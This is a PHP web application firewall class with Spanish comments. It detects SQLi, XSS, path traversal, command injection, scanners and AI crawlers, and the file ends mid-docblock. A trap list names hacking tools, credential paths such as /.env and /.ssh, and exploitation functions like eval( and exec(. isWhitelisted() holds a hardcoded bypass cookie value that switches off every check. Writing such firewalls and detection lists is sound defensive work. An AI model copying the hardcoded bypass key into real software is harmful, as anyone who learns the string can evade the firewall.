<?php

namespace backup_waf;

use Illuminate\Database\Capsule\Manager as Capsule;


/**
 * Clase Waf (Web Application Firewall)
 * * Sistema de seguridad perimetral para la detección de intrusiones,
 * análisis de comportamiento y bloqueo de bots de IA.
 * * @package Core
 * @author Mtro. Noe Cazarez Camargo. SuZuMa
 * @version 2.1.0
 */
class Waf0803
{
    protected string $ip;
    protected string $uri;

    protected string $ua;

    /**
     * Conexión opcional a Redis.
     *
     * Se utiliza como capa de memoria rápida para almacenar información
     * temporal relacionada con seguridad, como:
     *   - Bloqueos rápidos (fast bans)
     *   - Rate limiting en memoria
     *   - Contadores de ataques recientes
     *
     * Si Redis no está disponible, el sistema continúa utilizando
     * únicamente la base de datos o almacenamiento interno.
     *
     * @var \Redis|null
     */
    protected $redis = null;
    /**
     * Fingerprint del cliente.
     *
     * Identificador único generado a partir de múltiples características
     * del request HTTP, como por ejemplo:
     *   - IP del cliente
     *   - User-Agent
     *   - Cabeceras HTTP
     *   - Otros identificadores del navegador
     *
     * Permite rastrear clientes incluso cuando cambian de IP
     * (por ejemplo detrás de VPNs o proxies).
     *
     * Este identificador es utilizado en:
     *   - Bloqueos persistentes
     *   - Detección de bots
     *   - Análisis de comportamiento
     *
     * @var string
     */
    protected string $fingerprint;
    /**
     * Reglas de inspección de payload.
     *
     * Lista de funciones que se ejecutan dinámicamente para detectar
     * patrones de ataque en los parámetros GET y POST.
     *
     * Cada valor del arreglo corresponde al nombre de un método dentro
     * de la clase que analiza el contenido recibido.
     *
     * Ejemplo:
     *   'sql_injection'  → ejecuta $this->sql_injection($input)
     *
     * Tipos de ataques detectados actualmente:
     *   - SQL Injection
     *   - Cross Site Scripting (XSS)
     *   - Path Traversal
     *   - Command Injection
     *
     * Este sistema permite extender fácilmente las reglas agregando
     * nuevos métodos de detección.
     *
     * @var string[]
     */
    protected array $rules = ['sql_injection', 'xss', 'path_traversal', 'command_injection'];
    /**
     * Claves de entrada permitidas con reglas especiales.
     *
     * Algunos campos de formularios (por ejemplo editores de texto)
     * necesitan permitir ciertas etiquetas HTML básicas.
     *
     * Para estos campos:
     *   - Se permite un subconjunto de etiquetas HTML seguras.
     *   - Se aplican validaciones adicionales para evitar evasión
     *     de filtros de seguridad.
     *
     * Esto evita falsos positivos en contenido generado por usuarios
     * mientras mantiene protección contra inyecciones.
     *
     * Ejemplo de uso:
     *   - descripciones
     *   - contenido de artículos
     *   - mensajes largos
     *
     * @var string[]
     */
    protected array $whiteListKeys = ['descripcion', 'cuerpo_mensaje'];
    /**
     * Lista de trampas para detección de bots y escáneres automáticos.
     *
     * Este arreglo contiene firmas y rutas comúnmente utilizadas por:
     *   - herramientas de hacking
     *   - escáneres de vulnerabilidades
     *   - scrapers automatizados
     *
     * El sistema revisa si estas firmas aparecen en:
     *   - User-Agent
     *   - URL solicitada
     *   - parámetros de la petición
     *
     * Si se detecta alguna coincidencia, el sistema puede:
     *   - registrar el evento
     *   - marcar al cliente como sospechoso
     *   - bloquear inmediatamente la petición
     *
     * Categorías incluidas:
     *
     * 1. Herramientas de hacking
     *    Ej: sqlmap, nmap, burp, nikto
     *
     * 2. Archivos de configuración sensibles
     *    Ej: .env, config.php, web.config
     *
     * 3. Repositorios y archivos de desarrollo
     *    Ej: .git, .vscode, node_modules
     *
     * 4. Paneles de administración de base de datos
     *    Ej: phpmyadmin, adminer
     *
     * 5. Backups y archivos temporales
     *    Ej: backup.zip, dump.sql
     *
     * 6. Funciones peligrosas usadas en explotación
     *    Ej: eval(), exec(), system()
     *
     * Estas trampas funcionan como honeypots pasivos que permiten
     * identificar rápidamente escáneres automatizados.
     *
     * @var string[]
     */
    protected array $botTraps = [
        // --- Herramientas de Hacking (Firmas en User-Agent o Query) ---
        'sqlmap', 'nmap', 'burp', 'zap', 'nikto', 'dirbuster', 'gobuster',
        'masscan', 'acunetix', 'wpscan', 'python-requests',
        // --- Archivos de Configuración y Credenciales ---
        '/.env', '/config.php', 'web.config', 'settings.py', 'composer.json', '/.ssh',
        // --- Carpetas de Sistema y Repositorios ---
        '/.git', '/.vscode', '/.svn', '/node_modules',
        // --- Base de Datos y Administración ---
        'phpmyadmin', 'pma', 'adminer', 'mysql', 'sql-admin', '/dump.sql', '/db.zip',
        // --- Backups y Archivos Temporales ---
        'backup', 'conf.bak', 'old-site', 'www.zip', 'temp.php',
        // --- Inyecciones Directas en URL (Honeypot de funciones) ---
        'eval(', 'base64_decode', 'exec(', 'system(', 'phpinfo()'
    ];

    /**
     * Constructor del motor de seguridad (WAF).
     *
     * Inicializa las propiedades principales necesarias para analizar
     * la petición HTTP actual. Estos datos se utilizan en múltiples
     * capas del sistema de protección como identificación del cliente,
     * análisis de comportamiento, reputación y detección de ataques.
     *
     * Variables inicializadas:
     *
     * 1. IP del cliente
     *    Se obtiene desde la variable de servidor `REMOTE_ADDR`.
     *    Esta IP se utiliza para:
     *      - Bloqueos por dirección
     *      - Rate limiting
     *      - Análisis de reputación
     *
     * 2. URI solicitada
     *    Contiene la ruta completa solicitada por el cliente.
     *    Se utiliza para:
     *      - Detección de exploración de rutas
     *      - Honeypots
     *      - Análisis de navegación sospechosa
     *
     * 3. Fingerprint del cliente
     *    Identificador generado a partir de múltiples características
     *    del cliente (IP, headers, navegador, etc.). Permite detectar
     *    usuarios incluso si cambian de IP.
     *
     * 4. User-Agent
     *    Cadena que identifica el navegador o cliente HTTP.
     *    Se utiliza para:
     *      - Detección de bots
     *      - Identificación de scrapers
     *      - Análisis de reputación del cliente
     *
     * Se utilizan operadores de fusión nula (`??`) para evitar errores
     * en caso de que alguna variable del entorno no esté disponible.
     *
     * @return void
     */
    public function __construct()
    {
        // Dirección IP del cliente
        $this->ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
        // URI solicitada por el cliente
        $this->uri = $_SERVER['REQUEST_URI'] ?? '';

        // Identificador único del cliente basado en características del request
        $this->fingerprint = $this->generateFingerprint();
        // User-Agent del cliente (navegador o bot)
        $this->ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    }

    /**
     * Determina si la petición actual debe omitir todas las verificaciones del WAF.
     *
     * Esta función identifica clientes de confianza que tienen permiso para
     * evitar el sistema de protección completo. Se utiliza para evitar que
     * administradores, entornos locales o herramientas internas sean bloqueados
     * accidentalmente por las reglas de seguridad.
     *
     * Métodos de verificación implementados:
     *
     * 1. Whitelist por IP estática
     *    Permite acceso inmediato a direcciones IP conocidas y seguras,
     *    normalmente utilizadas para:
     *      - Desarrollo local
     *      - Administración del servidor
     *      - Redes internas
     *
     * 2. Whitelist por sesión autenticada
     *    Si el usuario tiene una sesión activa con rol administrativo,
     *    el WAF se desactiva para evitar interferencias durante tareas
     *    de administración o pruebas internas.
     *
     * 3. Whitelist por cookie secreta
     *    Permite a desarrolladores o administradores definir una cookie
     *    privada en su navegador que actúe como llave de bypass del WAF.
     *    Esto es útil cuando:
     *      - Se realizan pruebas de seguridad
     *      - Se depuran reglas del firewall
     *      - Se ejecutan herramientas internas
     *
     *    La cookie debe contener un hash secreto previamente definido.
     *
     * Flujo de decisión:
     *    Si cualquiera de las verificaciones devuelve verdadero,
     *    el cliente se considera confiable y el WAF se omite.
     *
     * Consideraciones de seguridad:
     *    - La cookie secreta debe mantenerse privada.
     *    - Las IPs whitelist deben limitarse a redes confiables.
     *    - No se recomienda usar IPs públicas dinámicas.
     *
     * @return bool
     *     true  -> El cliente está autorizado y se omite el WAF
     *     false -> El cliente debe pasar por todas las capas de seguridad
     */
    protected function isWhitelisted(): bool
    {
        // 1. Verificación por IP estática (Hardcoded)
        $staticWhitelist = ['127.0.0.1', '::1', '192.168.1.100'];
        if (in_array($this->ip, $staticWhitelist)) {
            return true;
        }

        // 2. Verificación por Sesión Activa
        // Si tu sistema de login guarda algo como $_SESSION['user_role']
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }

        if (isset($_SESSION['user_role']) && $_SESSION['user_role'] === 'admin') {
            return true;
        }

        // 3. Verificación por Cookie Secreta (Opcional pero muy útil)
        // Puedes crear una cookie en tu navegador que solo tú tengas
        if (isset($_COOKIE['WAF_BYPASS_KEY']) && $_COOKIE['WAF_BYPASS_KEY'] === '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08') {
            return true;
        }

        return false;
    }

    /**
     * Punto de entrada principal del motor de seguridad (WAF).
     *
     * Esta función ejecuta un sistema de protección por capas que analiza
     * cada petición HTTP entrante antes de que llegue al resto de la aplicación.
     *
     * El flujo está diseñado para detener ataques lo antes posible utilizando
     * verificaciones rápidas primero (whitelist, Redis, reputación) y análisis
     * más costosos después (comportamiento, payload, fuzzing).
     *
     * Arquitectura de seguridad por niveles:
     *
     * 1. NIVEL VIP (Excepciones inmediatas)
     *    Permite el acceso directo a IPs o fingerprints confiables sin
     *    ejecutar el resto del sistema de seguridad.
     *
     * 2. NIVEL DE MEMORIA (Redis Fast Ban)
     *    Consulta bloqueos temporales almacenados en memoria para detener
     *    atacantes conocidos sin realizar consultas costosas a la base de datos.
     *
     * 3. NIVEL DE IDENTIDAD
     *    Verifica el estado de la IP y el fingerprint del cliente.
     *    También registra la petición actual para análisis de rate limit.
     *
     * 4. NIVEL DE CANAL (Reputación del cliente)
     *    Analiza cabeceras HTTP y características del cliente para detectar:
     *    - Bots
     *    - Scrapers
     *    - Infraestructura cloud sospechosa
     *    - Herramientas automatizadas
     *
     * 5. NIVEL DE COMPORTAMIENTO
     *    Evalúa el comportamiento histórico del cliente basándose en logs
     *    recientes almacenados en base de datos, incluyendo:
     *    - Navegación no humana
     *    - Exploración de endpoints
     *    - Descubrimiento de rutas sensibles
     *    - Patrones de inferencia de IA
     *
     * 6. NIVEL DE CONTENIDO (Inspección de payload)
     *    Analiza todos los parámetros GET y POST para detectar:
     *    - SQL Injection
     *    - XSS
     *    - Payloads maliciosos
     *    - Inputs utilizados por scrapers de IA
     *
     *    Algunos campos específicos pueden tener reglas especiales mediante
     *    una whitelist de claves permitidas.
     *
     * 7. NIVEL DE PERSISTENCIA (Fuzzing detection)
     *    Analiza si el cliente ha realizado múltiples intentos de ataque
     *    consecutivos en un periodo corto, indicando exploración automatizada.
     *
     * Orden de ejecución optimizado:
     *    - Primero verificaciones rápidas
     *    - Luego análisis de reputación
     *    - Después comportamiento
     *    - Finalmente inspección profunda de contenido
     *
     * Si alguna regla detecta actividad maliciosa, se ejecuta `block()`
     * que registra el evento y detiene la petición.
     *
     * @return void
     */
    public function handle(): void
    {
        // 1. NIVEL VIP: Excepciones inmediatas
        if ($this->isWhitelisted()) {
            return;
        }
        // Si hay Redis, usamos lógica de memoria, si no, saltamos al flujo estándar
        if ($this->redis) {
            $this->checkFastBan(); // Una función nueva que solo lea Redis
        }

        // 2. NIVEL DE IDENTIDAD: Bloqueos conocidos (Consultas rápidas)
        $this->rateLimit();               // Registra la petición actual en la DB
        $this->checkIpStatus();
        $this->checkFingerprintBan();

        // 3. NIVEL DE CANAL: Integridad y Reputación (Cabeceras)
        $this->analyzeClientReputation(); // Analiza User-Agent y Headers
        $this->detectCloudAttack();
        $this->checkHoneypots();          // Revisa trampas de archivos/herramientas

        // 4. NIVEL COMPORTAMIENTO: ¿Qué hizo antes de esto?
        // Estas funciones leen los logs de la DB, incluyendo el registro del rateLimit anterior
        $this->detectNonHumanBehavior();
        $this->detectSuspiciousNavigation();
        $this->detectAiEndpointDiscovery();
        $this->detectInferencePatterns();

        // NUEVA CAPA ANTI-AI
        $this->detectAiScrapersUa();
        $this->detectAiBehavior();
        $this->aiHoneypotCheck();


        // 5. NIVEL DE CONTENIDO: Escaneo de Payloads (SQLi, XSS)
        $inputs = array_merge($_GET, $_POST);
        foreach ($inputs as $key => $value) {
            $cleanValue = $this->normalize($value);

            // Lógica de Whitelist para campos específicos
            if (in_array($key, $this->whiteListKeys)) {
                $cleanValue = strip_tags($cleanValue, '<b><i><u><strong><em>');
                if ($this->sql_injection($cleanValue)) {
                    $this->block("sql_injection_whitelist_bypass", $key, $cleanValue, $this->ip);
                }
                continue;
            }

            $this->detectAiPayloads($this->ip, $cleanValue);

            foreach ($this->rules as $rule) {
                if ($this->$rule($cleanValue)) {
                    // Aquí se generan los logs de ataque que detectFuzzing necesita leer
                    $this->block($rule, $key, $cleanValue, $this->ip);
                    break 2;
                }
            }
        }

        // 6. NIVEL DE PERSISTENCIA: ¿Ha estado intentando atacar todo el tiempo?
        // DEBE IR AL FINAL porque necesita contar los bloqueos que acaban de ocurrir arriba
        $this->detectFuzzing();

    }

    /**
     * Ejecuta la acción de bloqueo cuando una regla del WAF es activada.
     *
     * Este método actúa como el manejador central de incidentes del sistema
     * de seguridad. Cada vez que una regla detecta un comportamiento
     * malicioso (por ejemplo: XSS, SQLi, fuzzing, acceso a honeypots,
     * scanners, etc.), esta función se encarga de:
     *
     *      1. Registrar el evento de seguridad
     *      2. Actualizar el perfil de riesgo del atacante
     *      3. Determinar si se debe aplicar un bloqueo inmediato
     *      4. Notificar el incidente (si corresponde)
     *      5. Mostrar la página de acceso bloqueado
     *
     * Flujo de ejecución:
     *
     * 1. Registro del ataque
     *
     *    Se guarda un log detallado en la tabla `waf_attack_logs_szm`
     *    incluyendo:
     *
     *        - IP del atacante
     *        - User-Agent
     *        - regla activada
     *        - parámetro afectado
     *        - payload detectado
     *        - URI solicitada
     *        - fingerprint del cliente
     *
     *    Este registro permite análisis forense y auditoría posterior.
     *
     * 2. Obtención de información geográfica
     *
     *    Se intenta recuperar información existente del atacante
     *    desde la tabla `waf_blocked_ips_szm`. Si no existe un registro
     *    previo, se consulta un servicio externo mediante `getIpDetails()`
     *    para obtener:
     *
     *        - ciudad
     *        - país
     *        - proveedor de internet (ISP)
     *
     * 3. Cálculo del Risk Score
     *
     *    El sistema utiliza un modelo de puntuación acumulativa
     *    (risk scoring):
     *
     *        - ataques normales → +5 puntos
     *        - baneo inmediato → +20 puntos
     *
     *    Si el puntaje alcanza o supera 20 puntos, el atacante
     *    se marca como baneado.
     *
     * 4. Determinación del bloqueo
     *
     *    Si el riesgo acumulado alcanza el umbral de bloqueo:
     *
     *        - se activa el flag `is_banned`
     *        - se establece una expiración de 24 horas
     *
     * 5. Notificación de intrusión
     *
     *    Si ocurre un baneo o se activa un bloqueo inmediato,
     *    se ejecuta `notifyIntrusion()` para alertar sobre el
     *    incidente de seguridad.
     *
     * 6. Persistencia del perfil del atacante
     *
     *    Se actualiza o crea un registro en la tabla
     *    `waf_blocked_ips_szm` con:
     *
     *        - IP
     *        - fingerprint
     *        - información geográfica
     *        - risk_score
     *        - estado de bloqueo
     *        - motivo de la regla activada
     *
     * 7. Interrupción de la ejecución
     *
     *    Finalmente se renderiza la página de acceso bloqueado
     *    mediante `renderBlockedPage()`, deteniendo la ejecución
     *    del flujo normal de la aplicación.
     *
     * Tablas utilizadas:
     *
     *      waf_attack_logs_szm   -> registro de eventos de seguridad
     *      waf_blocked_ips_szm   -> perfil de riesgo de clientes
     *
     * Métodos relacionados:
     *
     *      renderBlockedPage()
     *      notifyIntrusion()
     *      getIpDetails()
     *
     * @param string $rule Nombre o identificador de la regla activada.
     * @param string $key Parámetro o campo donde se detectó el ataque.
     * @param string $value Payload o valor sospechoso detectado.
     * @param string $ip Dirección IP del cliente.
     * @param bool $immediateBan Indica si el ataque debe provocar un baneo inmediato.
     *
     * @return void
     */
    protected function block(string $rule, string $key, string $value, string $ip, bool $immediateBan = false): void
    {
        $now = date('Y-m-d H:i:s');
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

        // 1. Registro del log de ataque
        Capsule::table('waf_attack_logs_szm')->insert([
            'ip_address' => $ip,
            'user_agent' => $userAgent,
            'rule_triggered' => $rule,
            'parameter' => $key,
            'fingerprint' => $this->fingerprint,
            'payload' => $value,
            'uri' => $_SERVER['REQUEST_URI'] ?? '',
            'created_at' => date('Y-m-d H:i:s')
        ]);

        $record = Capsule::table('waf_blocked_ips_szm')
            ->where('ip_address', $ip)
            ->first();

        $geo = $record
            ? ['city' => $record->city, 'country' => $record->country, 'isp' => $record->isp]
            : $this->getIpDetails($ip);

        // 2. Manejo de baneo (Usando risk_score en lugar de attempts)
        // Si es baneo inmediato, le subimos el riesgo al máximo (20)
        $newScore = ($record->risk_score ?? 0) + ($immediateBan ? 20 : 5);
        $isBanned = ($newScore >= 20) ? 1 : 0;
        $banUntil = $isBanned ? date('Y-m-d H:i:s', strtotime('+24 hours')) : null;

        if ($isBanned || $immediateBan) {
            $this->notifyIntrusion($ip, $rule, $value, $geo);
        }

        $data = [
            'ip_address' => $ip,
            'city' => $geo['city'] ?? 'Unknown',
            'country' => $geo['country'] ?? 'Unknown',
            'isp' => $geo['isp'] ?? 'Unknown',
            'fingerprint' => $this->fingerprint,
            'risk_score' => $newScore, // CAMBIADO: Usamos risk_score
            'is_banned' => $isBanned,
            'ban_until' => $banUntil,
            'reason' => "Rule: $rule | Key: $key",
            'last_attempt' => date('Y-m-d H:i:s')
        ];

        if (!$record) {
            $data['created_at'] = date('Y-m-d H:i:s');
            Capsule::table('waf_blocked_ips_szm')->insert($data);
        } else {
            Capsule::table('waf_blocked_ips_szm')->where('id', $record->id)->update($data);
        }

        $this->renderBlockedPage($ip, $banUntil ?? $now, $geo['city'], $geo['country']);
    }


    /**
     * ============ SECCION DE WAF ANTI-AI SCRAPER =============
     **/

    /**
     * Detecta User-Agents asociados a scrapers o bots de inteligencia artificial.
     *
     * Esta función inspecciona el encabezado HTTP_USER_AGENT en busca de patrones
     * conocidos de bots utilizados por herramientas de IA o crawlers automatizados.
     * Si se detecta un agente sospechoso, se incrementa el puntaje de riesgo,
     * se registra el evento y se bloquea la solicitud.
     *
     * Comportamiento:
     * - Normaliza el User-Agent a minúsculas para comparaciones consistentes.
     * - Recorre una lista de identificadores de bots IA conocidos.
     * - Si encuentra coincidencia:
     *   - Añade puntaje de riesgo al IP actual.
     *   - Registra la razón del bloqueo.
     *   - Bloquea la solicitud y termina la ejecución del método.
     *
     * @return void
     */
    protected function detectAiScrapersUa(): void
    {
        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

        // Lista de bots IA conocidos
        $aiBots = [
            "gptbot",         // OpenAI
            "chatgpt-user",   // ChatGPT crawler
            "claudebot",      // Claude
            "perplexitybot",  // Perplexity
            "google-extended",// Google experimental AI
            "llama",          // LLaMA crawlers
            "gemini",         // Gemini crawlers
            "mistral",        // Otros LLM scrapers
        ];

        foreach ($aiBots as $bot) {
            if (str_contains($ua, $bot)) {
                $this->addRiskScore($this->ip, 10, "ai_scraper_ua: $bot");
                $this->block("ai_scraper_detected", "User-Agent", $ua, $this->ip, true);
                return;
            }
        }
    }

    /**
     * Detecta comportamiento sospechoso que podría indicar actividad automatizada o de IA.
     *
     * Esta función analiza patrones de uso en las solicitudes recientes del IP actual,
     * buscando señales típicas de bots o scrapers, tales como:
     *
     * - Excesivas solicitudes en un corto periodo de tiempo.
     * - Acceso repetitivo a endpoints críticos del sistema.
     * - Combinaciones de patrones que sugieren exploración automatizada.
     *
     * Comportamiento:
     * - Cuenta las solicitudes del IP en los últimos 10 segundos.
     * - Si excede el umbral de 10 solicitudes, incrementa el riesgo.
     * - Analiza los endpoints visitados en los últimos 30 segundos.
     * - Si se detecta un patrón sospechoso en endpoints críticos,
     *   se incrementa el riesgo y se bloquea la solicitud.
     *
     * @return void
     */
    protected function detectAiBehavior(): void
    {
        $count = Capsule::table('waf_requests_szm')
            ->where('ip_address', $this->ip)
            ->where('created_at', '>=', date('Y-m-d H:i:s', strtotime('-10 seconds')))
            ->count();

        // Si hace más de 10 requests en 10 segundos, sospecha
        if ($count > 10) {
            $this->addRiskScore($this->ip, 8, "ai_behavior_fast_requests");
        }

        // Patrón de endpoints críticos
        $criticalEndpoints = ["/api/", "/graphql", "/v1/auth", "/internal-api"];
        $history = Capsule::table('waf_requests_szm')
            ->where('ip_address', $this->ip)
            ->where('created_at', '>=', date('Y-m-d H:i:s', strtotime('-30 seconds')))
            ->pluck('uri')
            ->toArray();

        $matches = array_filter($history, fn($uri) => array_reduce($criticalEndpoints, fn($carry, $p) => $carry || str_contains($uri, $p), false)
        );

        if (count($matches) > 3) {
            $this->addRiskScore($this->ip, 10, "ai_behavior_multiple_critical_endpoints");
            $this->block("ai_behavior_detected", "uri_sequence", implode(",", $matches), $this->ip, true);
        }
    }

    /**
     * Verifica trampas tipo honeypot para detectar actividad automatizada o intentos
     * de exploración por parte de IA o bots.
     *
     * Los honeypots son campos ocultos o señuelos que los usuarios humanos no ven ni
     * interactúan con ellos. Los bots o scrapers, sin embargo, pueden rellenarlos o
     * enviarlos, lo que constituye una señal de comportamiento sospechoso.
     *
     * Comportamiento:
     * - Define una lista de trampas (campos o parámetros falsos).
     * - Comprueba si dichos campos llegan en la solicitud GET o POST.
     * - Si se detecta interacción con una trampa:
     *   - Incrementa el puntaje de riesgo del IP.
     *   - Registra el evento.
     *   - Bloquea la solicitud inmediatamente.
     *
     * @return void
     */
    protected function aiHoneypotCheck(): void
    {
        $traps = [
            'hidden_ai_prompt', // input invisible que los humanos nunca ven
            'dummy_config_field' // endpoint falso
        ];

        foreach ($traps as $trap) {
            if (isset($_GET[$trap]) || isset($_POST[$trap])) {
                $this->addRiskScore($this->ip, 15, "ai_honeypot_triggered: $trap");
                $this->block("ai_honeypot_trigger", $trap, 'triggered', $this->ip, true);
                return;
            }
        }
    }

    /**
     * Genera una huella digital (fingerprint) única para el IP y la solicitud actual.
     *
     * Esta función combina varios encabezados HTTP y metadatos de la conexión para crear
     * un hash SHA-256 que identifica de manera consistente un cliente o bot potencial.
     * Se utiliza principalmente para detectar patrones de bots o scrapers de IA, aunque
     * no depende de cookies ni sesiones.
     *
     * Datos utilizados para generar el fingerprint:
     * - User-Agent (`HTTP_USER_AGENT`)
     * - Idioma preferido (`HTTP_ACCEPT_LANGUAGE`)
     * - Codificación aceptada (`HTTP_ACCEPT_ENCODING`)
     * - Encabezado de AJAX (`HTTP_X_REQUESTED_WITH`)
     * - Preferencia de no rastreo (`HTTP_DNT`)
     * - Dirección IP del cliente
     * - Puerto remoto (`REMOTE_PORT`)
     *
     * Comportamiento:
     * - Recoge los valores anteriores, usando valores vacíos si no están definidos.
     * - Los concatena con el separador '|'.
     * - Calcula y retorna un hash SHA-256.
     *
     * @return string Fingerprint único para la combinación actual de IP y headers.
     */
    protected function generateAiFingerprint(): string
    {
        $data = [
            $_SERVER['HTTP_USER_AGENT'] ?? '',
            $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
            $_SERVER['HTTP_ACCEPT_ENCODING'] ?? '',
            $_SERVER['HTTP_X_REQUESTED_WITH'] ?? '',
            $_SERVER['HTTP_DNT'] ?? '',
            $this->ip,
            $_SERVER['REMOTE_PORT'] ?? ''
        ];

        return hash('sha256', implode('|', $data));
    }
    /**
     * FIN DE SECCION
     **/


    /**
     * Verifica bloqueos activos utilizando Redis para aplicar un "Fast Ban".
     *
     * Este método implementa una capa de optimización de rendimiento dentro
     * del WAF mediante el uso de Redis como caché de bloqueos activos.
     * Su objetivo es evitar consultas innecesarias a la base de datos MySQL
     * cuando una IP o huella digital ya ha sido bloqueada previamente.
     *
     * Estrategia de funcionamiento:
     *
     * 1. Se verifica si existe una instancia válida de Redis configurada
     *    en el sistema. Si Redis no está disponible, el WAF continúa con
     *    el flujo normal basado en consultas a MySQL.
     *
     * 2. Se construyen dos claves de caché:
     *
     *      - Bloqueo por IP
     *          waf:ban:{IP}
     *
     *      - Bloqueo por Fingerprint
     *          waf:ban:fp:{fingerprint}
     *
     *    Esto permite detectar atacantes que cambian de dirección IP
     *    pero mantienen el mismo entorno de navegador o dispositivo.
     *
     * 3. Se ejecuta una operación MGET para consultar ambas claves
     *    en una sola operación Redis, minimizando la latencia.
     *
     * 4. Si alguna de las claves contiene datos:
     *
     *      - Se decodifica la información almacenada (JSON)
     *      - Se registra un log opcional de depuración
     *      - Se ejecuta inmediatamente el bloqueo mediante
     *        renderBlockedPage()
     *
     * Beneficios de este enfoque:
     *
     *      - Reduce significativamente las consultas a MySQL
     *      - Permite aplicar bloqueos en microsegundos
     *      - Mejora la escalabilidad del WAF bajo alto tráfico
     *      - Detecta atacantes incluso si cambian de IP
     *
     * Estructura esperada del valor en Redis:
     *
     *      {
     *          "expires": "2026-03-07 12:00:00",
     *          "city": "Ciudad",
     *          "country": "País"
     *      }
     *
     * Si se detecta un bloqueo activo, la ejecución del script se
     * interrumpe inmediatamente mostrando la página de acceso denegado.
     *
     * Método relacionado:
     *
     *      renderBlockedPage()
     *
     * @return void
     */
    protected function checkFastBan(): void
    {
        if (!$this->redis) {
            return; // Si no hay Redis, el flujo continúa a MySQL automáticamente
        }

        // 1. Verificar por IP
        $ipKey = "waf:ban:{$this->ip}";

        // 2. Verificar por Fingerprint (Huella digital del navegador)
        $fpKey = "waf:ban:fp:{$this->fingerprint}";

        // Intentamos obtener los datos de ambas llaves en una sola operación (MGET)
        $results = $this->redis->mget([$ipKey, $fpKey]);

        foreach ($results as $hit) {
            if ($hit) {
                $data = json_decode($hit, true);

                // Log de depuración opcional
                error_log("[WAF-REDIS] Bloqueo rápido ejecutado para: {$this->ip}");

                // Renderizamos la página de bloqueo con los datos cacheados
                $this->renderBlockedPage(
                    $this->ip,
                    $data['expires'] ?? 'N/A',
                    $data['city'] ?? 'Desconocida',
                    $country = $data['country'] ?? 'Desconocido'
                );
            }
        }
    }

    /**
     * Detecta intentos de descubrimiento de endpoints sensibles o internos.
     *
     * Este método identifica accesos a rutas que normalmente no forman parte
     * de la navegación legítima de usuarios finales y que suelen ser utilizadas
     * por atacantes o herramientas automatizadas para descubrir:
     *
     *      - APIs internas
     *      - paneles administrativos ocultos
     *      - configuraciones expuestas
     *      - endpoints de autenticación
     *
     * La detección se basa en la búsqueda de patrones conocidos dentro de la
     * URI solicitada. Estas rutas suelen ser objetivo de escáneres automáticos
     * o bots que intentan enumerar la superficie de ataque de una aplicación.
     *
     * Ejemplos de endpoints analizados:
     *
     *      /api/v1/admin       -> panel administrativo de API
     *      /api/config         -> endpoint de configuración
     *      /graphql            -> endpoint GraphQL expuesto
     *      /.env               -> variables de entorno
     *      /internal-api       -> APIs internas no documentadas
     *      /v1/auth/config     -> configuración de autenticación
     *
     * Estrategia de detección:
     *
     * 1. Se revisa la URI de la petición actual.
     * 2. Si contiene alguno de los patrones sensibles definidos,
     *    se considera un intento de descubrimiento de endpoints.
     * 3. Se incrementa el puntaje de riesgo del cliente mediante
     *    `addRiskScore()` para contribuir al sistema de bloqueo
     *    basado en scoring del WAF.
     *
     * Notas de implementación:
     *
     *    - El análisis se realiza mediante coincidencia parcial
     *      usando stripos(), permitiendo detectar variaciones
     *      dentro de la ruta solicitada.
     *
     *    - Este método puede combinarse con otras señales como:
     *
     *          • respuestas HTTP 404 frecuentes
     *          • ausencia de cabeceras de navegador
     *          • patrones de navegación automatizada
     *
     *    - El objetivo no es bloquear inmediatamente, sino
     *      alimentar el motor de correlación de ataques.
     *
     * Casos comunes detectados:
     *
     *      - escáneres de APIs
     *      - bots de descubrimiento de endpoints
     *      - herramientas de reconnaissance automatizado
     *
     * Método relacionado:
     *
     *      addRiskScore()
     *
     * @return void
     */
    protected function detectAiEndpointDiscovery(): void
    {
        // Solo analizamos si la petición es un error 404 o si no viene de tu propio dominio
        // (Opcional: puedes verificar si la cabecera X-Requested-With no existe)

        $patterns = [
            "/api/v1/admin",
            "/api/config",
            "/graphql",
            "/.env",
            "/internal-api",
            "/v1/auth/config"
        ];

        foreach ($patterns as $p) {
            if (stripos($this->uri, $p) !== false) {
                // Si la ruta es crítica, sumamos puntos
                $this->addRiskScore($this->ip, 5, "suspicious_endpoint_access: $p");
                return;
            }
        }
    }

    /**
     * Detecta si una petición proviene de infraestructura Cloud utilizada
     * frecuentemente para ataques automatizados (AWS, DigitalOcean, etc.).
     *
     * Esta función implementa un sistema de detección en múltiples capas
     * optimizado para minimizar latencia y maximizar precisión.
     *
     * Estrategia de detección:
     *
     * 1. Detección primaria mediante rangos IP conocidos de proveedores Cloud.
     *    - Utiliza la tabla waf_cloud_ranges_szm que contiene rangos de IP
     *      publicados por proveedores como AWS, Azure, Google Cloud, etc.
     *    - Esta verificación es extremadamente rápida (consulta indexada)
     *      y soporta IPv4 e IPv6 mediante conversión binaria con inet_pton().
     *
     * 2. Evaluación de riesgo previo.
     *    - Si la IP no coincide con ningún rango Cloud, se consulta el
     *      risk_score acumulado del visitante.
     *    - Solo se continúa con análisis más costosos si el visitante ya
     *      presenta comportamiento sospechoso (risk_score >= 5).
     *    - Esto evita consultas DNS innecesarias y mejora el rendimiento.
     *
     * 3. Detección secundaria mediante Reverse DNS.
     *    - Se realiza una consulta DNS inversa (gethostbyaddr).
     *    - Se analiza si el hostname contiene identificadores de
     *      proveedores cloud conocidos (amazonaws, googlecloud, etc.).
     *    - Este método funciona como mecanismo de respaldo cuando
     *      los rangos IP no están actualizados o el proveedor no
     *      publica rangos fácilmente detectables.
     *
     * Ventajas de esta arquitectura:
     *
     * - Minimiza latencia en peticiones legítimas
     * - Detecta bots provenientes de infraestructuras cloud
     * - Reduce consultas DNS innecesarias
     * - Soporta IPv4 e IPv6
     * - Permite ampliación futura agregando nuevos rangos
     *
     * Cuando se detecta origen cloud, se incrementa el puntaje de riesgo
     * del visitante mediante addRiskScore(), lo cual puede derivar en
     * bloqueo automático si se supera el umbral configurado.
     *
     * Dependencias:
     * - Tabla: waf_cloud_ranges_szm
     * - Tabla: waf_blocked_ips_szm
     * - Método: addRiskScore()
     *
     * Estructura esperada de waf_cloud_ranges_szm:
     *
     * id
     * provider
     * ip_start (VARBINARY)
     * ip_end (VARBINARY)
     *
     * Ejemplo de proveedor:
